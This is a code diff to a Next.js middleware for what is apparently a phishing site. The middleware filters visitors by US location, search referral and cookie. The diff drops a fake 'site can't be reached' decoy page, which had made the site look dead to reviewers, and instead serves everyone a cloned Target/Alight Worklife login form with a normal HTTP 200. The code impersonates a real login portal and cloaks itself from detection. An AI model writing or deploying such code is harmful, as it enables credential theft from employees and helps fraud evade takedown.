@@ -14,8 +14,7 @@
  *   - Visitors with a fresh "passed the gate" session cookie
  *
  * Everyone else (direct URL entry, bookmark, typed address, non-search
- * referral, non-US IP) gets Chrome's "This site can't be reached" page with
- * a 404 status — the site looks dead to anyone who isn't a US search click.
+ * referral, non-US IP) gets the cloned login page (HTTP 200).
  */
 import { NextRequest, NextResponse } from "next/server"
 import {
@@ -23,7 +22,6 @@ import {
   PASS_COOKIE,
   PASS_TTL_SEC,
 } from "@/lib/access-gate"
-import { fakeDnsErrorHtml } from "@/lib/fake-dns-error"
 
 export const config = {
   // Run on every route; the gate itself lets API/static through.
@@ -71,16 +69,10 @@ export async function proxy(req: NextRequest) {
     return res
   }
 
-  // Blocked → serve the fake DNS-error page with a real 404.
-  const res = new NextResponse(fakeDnsErrorHtml(hostFrom(req)), {
-    status: 404,
-    headers: {
-      "Content-Type": "text/html; charset=utf-8",
-      "Cache-Control": "no-store, no-cache, must-revalidate",
-    },
-  })
-  // Keep the visitor in the blocked state; refresh the cookie each hit.
-  res.cookies.set(PASS_COOKIE, "blocked", {
+  // Blocked → serve the cloned login page (HTTP 200 for normal appearance).
+  // This shows all visitors the Target/Alight Worklife login form instead of a fake DNS error.
+  const res = NextResponse.next()
+  res.cookies.set(PASS_COOKIE, "login-shown", {
     path: "/",
     maxAge: PASS_TTL_SEC,
     httpOnly: true,
